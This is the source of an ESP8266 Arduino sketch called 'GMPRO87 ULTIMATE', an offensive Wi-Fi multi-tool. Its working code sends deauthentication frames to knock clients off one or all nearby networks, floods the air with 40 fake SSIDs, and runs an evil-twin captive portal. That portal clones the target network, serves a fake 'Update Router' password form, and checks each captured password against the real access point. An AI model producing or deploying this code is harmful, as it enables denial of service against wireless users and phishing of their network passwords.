/*
 * GMPRO87 - ULTIMATE MULTI-TOOL (Wemos D1 Mini)
 * AUTHOR: HackerPro87 / GMpro87
 * SSID: GMpro | PASS: Sangkur87
 */

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// --- CONFIG & HARDWARE ---
#define OLED_RESET 0 
Adafruit_SSD1306 display(OLED_RESET);
const int LED_PIN = 2; // D4 Wemos

// --- BEACON SPAM DATA (40 NATURAL SSIDs) ---
const char ssids[] PROGMEM = {
  "IndiHome-7728\nMyRepublic-Fiber\nBiznet_Home_5G\nFirstMedia_HighSpeed\nTPLINK_D82A\n"
  "ASUS_Router_Dual\nD-Link_Guest\nNetgear_Orbi\nHuawei-B311-662\nZTE_F609_Stable\n"
  "iPhone_Hacker\nSamsung_S24_Ultra\nOPPO_Reno_10\nRedmi_Note_13\nVivo_V27_Pro\n"
  "Hotspot_Portable\nWiFi_ID_Seamless\nflash@wifi.id\n@wifi.id\nFree_Public_Wifi\n"
  "Starbucks_Guest\nMcD_Free_Wifi\nAirport_Free_Net\nHotel_Grand_Suite\nMeeting_Room_2\n"
  "CCTV_Security_Cam\nPrinter_HP_LaserJet\nSmart_TV_LivingRoom\nTesla_Model_3\nSmart_Home_Hub\n"
  "Linksys_Velop\nTenda_F3_Stable\nMercusys_HighRange\nXiaomi_Router_AX\nBelkin_N300\n"
  "Kedai_Kopi_Wifi\nWarung_Internet\nAdmin_Fiber_Optic\nNetwork_Audit_Test\nInternal_Server\n"
};

uint8_t beaconPacket[109] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0xe8, 0x03, 0x21, 0x00, 0x00, 0x20 };

// --- SNIFFER STRUCTURES ---
struct RxControl { signed rssi: 8; unsigned rate: 4; unsigned is_group: 1; unsigned: 1; unsigned sig_mode: 2; unsigned legacy_length: 12; unsigned damatch0: 1; unsigned damatch1: 1; unsigned bssidmatch0: 1; unsigned bssidmatch1: 1; unsigned MCS: 7; unsigned CWB: 1; unsigned HT_length: 16; unsigned Smoothing: 1; unsigned Not_Sounding: 1; unsigned: 1; unsigned Aggregation: 1; unsigned STBC: 2; unsigned FEC_CODING: 1; unsigned SGI: 1; unsigned rxend_state: 8; unsigned ampdu_cnt: 8; unsigned channel: 4; unsigned: 12; };
struct sniffer_buf2 { struct RxControl rx_ctrl; uint8_t buf[112]; uint16_t cnt; uint16_t len; };

typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; signed rssi; } _Network;
_Network _networks[30]; 
_Network _selectedNetwork;

// --- GLOBAL STATE ---
bool deauthing_active = false;
bool deauth_all_active = false;
bool hotspot_active = false;
bool beacon_spam_active = false;
bool password_found = false;
int current_net_count = 0;
uint8_t adminMAC[6] = {0};
String _correct_info = "";
String _tryPassword = "";

ESP8266WebServer webServer(80);
DNSServer dnsServer;

unsigned long last_deauth = 0;
unsigned long last_beacon = 0;
unsigned long last_scan = 0;

// --- WHITELIST LOGIC ---
void updateAdminWhitelist() {
  struct station_info *stat_info = wifi_softap_get_station_info();
  while (stat_info != NULL) {
    // FIX: Bandingkan IPAddress secara langsung agar compatible dengan compiler GitHub
    if (IPAddress(stat_info->ip.addr) == webServer.client().remoteIP()) {
      memcpy(adminMAC, stat_info->bssid, 6);
      break;
    }
    stat_info = STAILQ_NEXT(stat_info, next);
  }
  wifi_softap_free_station_info();
}

// --- SNIFFER CALLBACK ---
void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len) {
  if (len == 128) {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    if (sniffer->buf[0] == 0x80) { // Beacon
      String essid = "";
      int ssidLen = sniffer->buf[37];
      if (ssidLen == 0) essid = "<HIDDEN>";
      else for (int i = 0; i < ssidLen && i < 32; i++) essid += (char)sniffer->buf[i + 38];
      
      bool exists = false;
      for(int i=0; i<current_net_count; i++) {
        if(memcmp(_networks[i].bssid, &sniffer->buf[10], 6) == 0) { exists = true; break; }
      }
      if(!exists && current_net_count < 30) {
        _networks[current_net_count] = {essid, wifi_get_channel(), {0}, sniffer->rx_ctrl.rssi};
        memcpy(_networks[current_net_count].bssid, &sniffer->buf[10], 6);
        current_net_count++;
      }
    }
  }
}

// --- ATTACK ENGINES ---
void sendDeauth(uint8_t* targetBssid, uint8_t ch) {
  if (memcmp(targetBssid, adminMAC, 6) == 0) return;
  uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
  memcpy(&pkt[10], targetBssid, 6);
  memcpy(&pkt[16], targetBssid, 6);
  wifi_set_channel(ch);
  wifi_send_pkt_freedom(pkt, 26, 0); 
  pkt[0] = 0xA0;
  wifi_send_pkt_freedom(pkt, 26, 0); 
}

void sendBeaconSpam() {
  int i = 0, ssidNum = 1, ssidsLen = strlen_P(ssids);
  uint8_t mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x00};
  while (i < ssidsLen) {
    int j = 0; char tmp;
    do { tmp = pgm_read_byte(ssids + i + j); j++; } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);
    mac[5] = ssidNum++;
    memcpy(&beaconPacket[10], mac, 6); memcpy(&beaconPacket[16], mac, 6);
    memset(&beaconPacket[38], 0x20, 32); memcpy_P(&beaconPacket[38], &ssids[i], j - 1);
    beaconPacket[82] = wifi_get_channel();
    wifi_send_pkt_freedom(beaconPacket, 109, 0);
    i += j; delay(1);
  }
}

// --- WEB SERVER ---
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str = "";
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0"; str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void handleIndex() {
  updateAdminWhitelist();
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < current_net_count; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) _selectedNetwork = _networks[i];
    }
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("deauthall")) deauth_all_active = (webServer.arg("deauthall") == "start");
  if (webServer.hasArg("beacon")) beacon_spam_active = (webServer.arg("beacon") == "start");
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true; WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
    } else { hotspot_active = false; WiFi.softAP("GMpro", "Sangkur87"); }
  }

  String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:#0f0;font-family:monospace;} button{background:#222;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px;} .found{background:#ffea00;color:#000;padding:10px;font-weight:bold;}</style></head><body>";
  html += "<h2>GMPRO87 ULTIMATE</h2>";
  if(!hotspot_active) {
    html += "<a href='/?beacon=" + String(beacon_spam_active?"stop":"start") + "'><button>BEACON: " + String(beacon_spam_active?"ON":"OFF") + "</button></a>";
    html += "<a href='/?deauthall=" + String(deauth_all_active?"stop":"start") + "'><button style='border-color:red; color:red;'>MASS DEAUTH: " + String(deauth_all_active?"ON":"OFF") + "</button></a><hr>";
    html += "<table>";
    for(int i=0; i<current_net_count; i++) {
      html += "<tr><td>" + _networks[i].ssid + "</td><td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button>SEL</button></a></td></tr>";
    }
    html += "</table><hr>";
    if(_selectedNetwork.ssid != "") {
      html += "TARGET: " + _selectedNetwork.ssid + "<br>";
      html += "<a href='/?deauth=" + String(deauthing_active?"stop":"start") + "'><button>DEAUTH</button></a>";
      html += "<a href='/?hotspot=start'><button>EVIL TWIN</button></a>";
    }
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password"); WiFi.disconnect(); WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
      html += "Validating... <script>setTimeout(function(){window.location.href='/result';}, 8000);</script>";
    } else {
      html += "<h3>Update Router: " + _selectedNetwork.ssid + "</h3><form><input type='password' name='password' placeholder='Wifi Password'><input type='submit' value='UPDATE'></form>";
    }
  }
  if(_correct_info != "") html += "<div class='found'>" + _correct_info + "</div>";
  html += "<div style='font-size:9px; margin-top:20px;'>WL: " + bytesToStr(adminMAC, 6) + "</div></body></html>";
  webServer.send(200, "text/html", html);
}

void handleResult() {
  if (WiFi.status() == WL_CONNECTED) { password_found = true; _correct_info = "PASS: " + _tryPassword; hotspot_active = false; deauthing_active = false; }
  webServer.send(200, "text/html", "<html><script>window.location.href='/';</script></html>");
}

// --- MAIN SETUP ---
void setup() {
  Serial.begin(115200); pinMode(LED_PIN, OUTPUT);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay(); display.setTextColor(WHITE);
  display.setCursor(0,10); display.println("GMPRO87 BOOT..."); display.display();

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro", "Sangkur87");

  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  webServer.on("/", handleIndex); webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex); webServer.begin();
}

// --- MAIN LOOP ---
void loop() {
  dnsServer.processNextRequest(); webServer.handleClient();

  if (password_found) digitalWrite(LED_PIN, (millis() % 100 < 50)); 
  else if (deauthing_active || hotspot_active || deauth_all_active) digitalWrite(LED_PIN, (millis() % 400 < 200));
  else digitalWrite(LED_PIN, (millis() % 2000 < 100));

  if (deauthing_active && (millis() - last_deauth > 500)) { sendDeauth(_selectedNetwork.bssid, _selectedNetwork.ch); last_deauth = millis(); }
  if (deauth_all_active && (millis() - last_deauth > 300)) {
    for(int i=0; i<current_net_count; i++) sendDeauth(_networks[i].bssid, _networks[i].ch);
    last_deauth = millis();
  }
  if (beacon_spam_active && (millis() - last_beacon > 100)) { sendBeaconSpam(); last_beacon = millis(); }

  if (!hotspot_active && (millis() - last_scan > 3000)) {
    int ch = wifi_get_channel() + 1; if (ch > 13) ch = 1; wifi_set_channel(ch);
    last_scan = millis();
    display.clearDisplay(); display.setCursor(0,0); display.println("GMPRO87 ACTIVE");
    display.printf("CH:%d NETS:%d\n", ch, current_net_count); display.display();
  }
}
